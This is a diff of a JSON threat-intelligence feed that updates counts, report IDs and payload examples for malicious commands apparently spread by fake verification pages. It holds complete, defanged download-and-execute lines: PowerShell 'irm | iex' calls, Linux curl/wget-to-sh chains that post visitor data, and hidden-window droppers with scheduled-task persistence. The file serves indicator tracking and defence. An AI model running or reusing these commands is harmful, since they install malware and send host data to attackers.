@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 146,
-    "ReportCount": 146,
+    "DistinctPayloadCount": 147,
+    "ReportCount": 147,
     "FirstSeen": "2026-11-10T09:55:19.073000+00:00",
-    "LastSeen": "2026-11-16T08:49:20.942000+00:00",
+    "LastSeen": "2026-11-16T09:40:47.966000+00:00",
     "ReportIds": [
       "cmwaikzu608q10omllivblirh",
       "cmwaila5l08ql0omlduekey7c",
@@ -151,7 +151,8 @@
       "cmwisyhmp14rj0omlh338nnz3",
       "cmwit1y3914yo0omlqcjz8cp0",
       "cmwitidqb15as0omlgexbciky",
-      "cmwj0v9pp16ce0oml2knj3vss"
+      "cmwj0v9pp16ce0oml2knj3vss",
+      "cmwj2pfpi16fo0oml58q7h0a1"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -216,6 +217,7 @@
       "irm 'browse-cloud.codes/f0e07856f01b4cda'|iex;",
       "irm 'browse-cloud.codes/f141a3fc3b742e21'|iex;",
       "irm 'browse-cloud.codes/f19c44dcc955c4eb'|iex;",
+      "irm 'browse-cloud.codes/f7ed5df838d3e4b9'|iex;",
       "irm 'browse-cloud.codes/fe2aab3b32968bba'|iex;",
       "irm 'browse-nnccodes.beer/01b5a3d4cceef7ae'|iex;",
       "irm 'browse-nnccodes.beer/02275e4ee7b11819'|iex;",
@@ -304,10 +306,10 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 54,
-    "ReportCount": 54,
+    "DistinctPayloadCount": 55,
+    "ReportCount": 55,
     "FirstSeen": "2026-11-10T21:10:36.912000+00:00",
-    "LastSeen": "2026-11-16T05:09:59.901000+00:00",
+    "LastSeen": "2026-11-16T09:53:58.154000+00:00",
     "ReportIds": [
       "cmwb6pfm0018w0nmlotuah88g",
       "cmwb7rf82021p0nmli0ofq41p",
@@ -362,7 +364,8 @@
       "cmwisbupy13tv0omlq8yszzue",
       "cmwisfhxi140n0omlpt66q4f5",
       "cmwiswq5o14om0omlkitg748t",
-      "cmwit16lh14vq0omltoojvgaj"
+      "cmwit16lh14vq0omltoojvgaj",
+      "cmwj36dfi16xf0omlymjsogg9"
     ],
     "PayloadExamples": [
       "curl -sL -d \"id=0048088b-86c5-4092-8adf-ae27e12f8b11&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcompany-hamza-abbs[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T14%3A45%3A29.831Z&lastShellAt=2026-11-11T14%3A45%3A29.831Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
@@ -379,6 +382,7 @@
       "curl -sL -d \"id=31b97fa1-39da-4828-8ef2-39dd5e1ba7ce&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcleanveins[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T02%3A56%3A40.406Z&lastShellAt=2026-11-15T02%3A56%3A40.406Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=32a2d45d-3956-41fc-b1fa-74300ba93aa9&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsobhacity[.]cherrycart[.]in%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A42%3A35.230Z&lastShellAt=2026-11-16T04%3A42%3A35.230Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=32caa379-7611-43b0-a2fe-74bafeda149a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]leadgg[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A59%3A21.605Z&lastShellAt=2026-11-16T03%3A59%3A21.605Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+      "curl -sL -d \"id=3a96f2ac-d8cc-4a7c-aff7-af9a616c7694&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsolidhome110[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T09%3A52%3A35.491Z&lastShellAt=2026-11-16T09%3A52%3A35.491Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=3ec21352-bff8-4e95-9cf4-6287e383ca91&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falkhaleej-shopping[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T11%3A59%3A16.381Z&lastShellAt=2026-11-11T11%3A59%3A16.381Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=3f6b069c-e07a-45bf-aae1-7dc92802a60a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fprecisiontanksystems[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A49%3A16.510Z&lastShellAt=2026-11-16T03%3A49%3A16.510Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=42c334f4-c709-4741-b94b-2f63e06d38ad&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsteff.cc%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T05%3A05%3A09.671Z&lastShellAt=2026-11-16T05%3A05%3A09.671Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
@@ -511,9 +515,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 16,
-    "ReportCount": 152,
+    "ReportCount": 153,
     "FirstSeen": "2026-11-09T10:07:06.059000+00:00",
-    "LastSeen": "2026-11-16T05:31:29.471000+00:00",
+    "LastSeen": "2026-11-16T09:40:35.633000+00:00",
     "ReportIds": [
       "cmw93kaoj2igo0omlf6r87ldo",
       "cmw9cew5j2iui0omli3epud81",
@@ -666,7 +670,8 @@
       "cmwip7qyl10kv0oml5lmz6u6u",
       "cmwipmr8w10qm0omla41u3zjf",
       "cmwipnx5h10rt0omlraf3fb6q",
-      "cmwitstsl15m00omlpia4l632"
+      "cmwitstsl15m00omlpia4l632",
+      "cmwj2p67u16ef0oml8gvz64x2"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -751,11 +756,28 @@
     ]
   },
   {
+    "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && curl -fsSL \"<URL>\" | sh",
+    "DistinctPayloadCount": 3,
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-11T02:37:12.276000+00:00",
+    "LastSeen": "2026-11-16T09:56:50.445000+00:00",
+    "ReportIds": [
+      "cmwbidflq07sb0nml927bheu2",
+      "cmwiq0vbr11350oml4i7d56wf",
+      "cmwj3a2cb17150omlr80ejlu5"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=7d505875-ada6-4cf1-a0e0-5e9424e02e57&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fkp2online[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A44%3A21.900Z&lastShellAt=2026-11-16T03%3A44%3A21.900Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+      "curl -sL -d \"id=8210ad04-beab-4e13-8c15-48d31c63313f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmehedi3937[.]infinityfreeapp[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-11T02%3A35%3A49.557Z&lastShellAt=2026-11-11T02%3A35%3A49.557Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+      "curl -sL -d \"id=d8cd13f9-945f-4e56-ac4b-f1eb67c3700a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]atb[.]ikaya[.]nl%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T09%3A55%3A25.496Z&lastShellAt=2026-11-16T09%3A55%3A25.496Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh"
+    ]
+  },
+  {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 40,
+    "ReportCount": 43,
     "FirstSeen": "2026-11-10T04:54:46.148000+00:00",
-    "LastSeen": "2026-11-16T03:11:24.720000+00:00",
+    "LastSeen": "2026-11-16T09:55:17.871000+00:00",
     "ReportIds": [
       "cmwa7uhjs07yx0omlfjdv2k9y",
       "cmwafa1yg08ee0omlkfez3dt8",
@@ -796,7 +818,10 @@
       "cmwh9nozg0qd60oml0fnpuhy7",
       "cmwh9nuke0qe30oml6tbk0se8",
       "cmwijlxrh0zwy0omlmlk3hhqx",
-      "cmwiosojj10g80omlecnzsl55"
+      "cmwiosojj10g80omlecnzsl55",
+      "cmwj33cj016tu0oml5m5v87wb",
+      "cmwj36tyq16yb0omldf4pvs2n",
+      "cmwj382w016zu0omlgui30fhv"
     ],
     "PayloadExamples": [
       "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
@@ -849,21 +874,6 @@
     "PayloadExamples": [
       "Write-Host 'Verifying';$d=Join-Path $env:LOCALAPPDATA ([guid]::NewGuid().ToString('N').Substring(0,12));New-Item -ItemType Directory -Path $d -Force|Out-Null;$z=Join-Path $d 'bsdvaoqma0ilf.zip';$ok=$false;foreach($p in 0,10,25,40){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};foreach($b in @('https://apidatalive[.]com/k/m255fDhVEvxs4mO9/collect?t=item&ti=4wpwLosTMSRrYNN4oQeDyIpm')){try{Invoke-WebRequest -UseBasicParsing -Uri $b -OutFile $z;if(Test-Path $z){$ok=$true;break}}catch{}};if($ok){foreach($p in 55,70){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};Expand-Archive -LiteralPath $z -DestinationPath $d -Force;Remove-Item -LiteralPath $z -Force;$n=Join-Path $d 'npp_x\\notepad++.exe';$bp=Join-Path $d 'npp_boot.ps1';Set-Content -LiteralPath $bp -Value \"Set-Location '$d\\npp_x';`$pp=Get-Process -Name 'notepad++' -ErrorAction SilentlyContinue|Where-Object {`$_.Path -eq '$n'};if(-not `$pp){`$np=Start-Process -FilePath '$n' -ArgumentList '-multiInst' -WindowStyle Hidden -PassThru;try{Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class ZW{[DllImport(`\"user32.dll`\")]public static extern bool EnumWindows(CB c,IntPtr l);public delegate bool CB(IntPtr h,IntPtr l);[DllImport(`\"user32.dll`\")]public static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);[DllImport(`\"user32.dll`\")]public static extern bool ShowWindow(IntPtr h,int c);}';for(`$i=0;`$i -lt 60;`$i++){[ZW]::EnumWindows({param(`$h,`$l)`$q=[uint32]0;[void][ZW]::GetWindowThreadProcessId(`$h,[ref]`$q);if(`$q -eq `$np.Id){[void][ZW]::ShowWindow(`$h,0)};return `$true},[IntPtr]::Zero);Start-Sleep -Milliseconds 500}}catch{}}\";$tn=[guid]::NewGuid().ToString('N').Substring(0,16);& schtasks.exe /create /tn $tn /tr \"powershell.exe -w hidden -NoProfile -ExecutionPolicy Bypass -File `\"$bp`\"\" /sc HOURLY /mo 1 /f|Out-Null;foreach($p in 85,95,100){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};Start-Process powershell.exe -ArgumentList \"-w hidden -NoProfile -ExecutionPolicy Bypass -File `\"$bp`\"\" -WindowStyle Hidden|Out-Null;Write-Host 'Verified'}else{Write-Host 'Verification failed';Remove-Item -Recurse -Force $d -ErrorAction SilentlyContinue};exit",
       "Write-Host 'Verifying';$d=Join-Path $env:LOCALAPPDATA ([guid]::NewGuid().ToString('N').Substring(0,12));New-Item -ItemType Directory -Path $d -Force|Out-Null;$z=Join-Path $d 'bsdvaoqma0ilf.zip';$ok=$false;foreach($p in 0,10,25,40){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};foreach($b in @('https://apidatalive[.]com/m255fDhVEvxs4mO9?t=item&ti=tSzsqA3ibVRgfEkd9JtRFAD-')){try{Invoke-WebRequest -UseBasicParsing -Uri $b -OutFile $z;if(Test-Path $z){$ok=$true;break}}catch{}};if($ok){foreach($p in 55,70){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};Expand-Archive -LiteralPath $z -DestinationPath $d -Force;Remove-Item -LiteralPath $z -Force;$n=Join-Path $d 'npp_x\\notepad++.exe';$bp=Join-Path $d 'npp_boot.ps1';Set-Content -LiteralPath $bp -Value \"Set-Location '$d\\npp_x';`$pp=Get-Process -Name 'notepad++' -ErrorAction SilentlyContinue|Where-Object {`$_.Path -eq '$n'};if(-not `$pp){`$np=Start-Process -FilePath '$n' -ArgumentList '-multiInst' -WindowStyle Hidden -PassThru;try{Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class ZW{[DllImport(`\"user32.dll`\")]public static extern bool EnumWindows(CB c,IntPtr l);public delegate bool CB(IntPtr h,IntPtr l);[DllImport(`\"user32.dll`\")]public static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);[DllImport(`\"user32.dll`\")]public static extern bool ShowWindow(IntPtr h,int c);}';for(`$i=0;`$i -lt 60;`$i++){[ZW]::EnumWindows({param(`$h,`$l)`$q=[uint32]0;[void][ZW]::GetWindowThreadProcessId(`$h,[ref]`$q);if(`$q -eq `$np.Id){[void][ZW]::ShowWindow(`$h,0)};return `$true},[IntPtr]::Zero);Start-Sleep -Milliseconds 500}}catch{}}\";$tn=[guid]::NewGuid().ToString('N').Substring(0,16);& schtasks.exe /create /tn $tn /tr \"powershell.exe -w hidden -NoProfile -ExecutionPolicy Bypass -File `\"$bp`\"\" /sc HOURLY /mo 1 /f|Out-Null;foreach($p in 85,95,100){Write-Host (\"Verifying... {0}%\" -f $p);Start-Sleep -Milliseconds 300};Start-Process powershell.exe -ArgumentList \"-w hidden -NoProfile -ExecutionPolicy Bypass -File `\"$bp`\"\" -WindowStyle Hidden|Out-Null;Write-Host 'Verified'}else{Write-Host 'Verification failed';Remove-Item -Recurse -Force $d -ErrorAction SilentlyContinue};exit"
-    ]
-  },
-  {
-    "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && curl -fsSL \"<URL>\" | sh",
-    "DistinctPayloadCount": 2,
-    "ReportCount": 2,
-    "FirstSeen": "2026-11-11T02:37:12.276000+00:00",
-    "LastSeen": "2026-11-16T03:45:46.426000+00:00",
-    "ReportIds": [
-      "cmwbidflq07sb0nml927bheu2",
-      "cmwiq0vbr11350oml4i7d56wf"
-    ],
-    "PayloadExamples": [
-      "curl -sL -d \"id=7d505875-ada6-4cf1-a0e0-5e9424e02e57&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fkp2online[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A44%3A21.900Z&lastShellAt=2026-11-16T03%3A44%3A21.900Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
-      "curl -sL -d \"id=8210ad04-beab-4e13-8c15-48d31c63313f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmehedi3937[.]infinityfreeapp[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-11T02%3A35%3A49.557Z&lastShellAt=2026-11-11T02%3A35%3A49.557Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh"
     ]
   },
   {
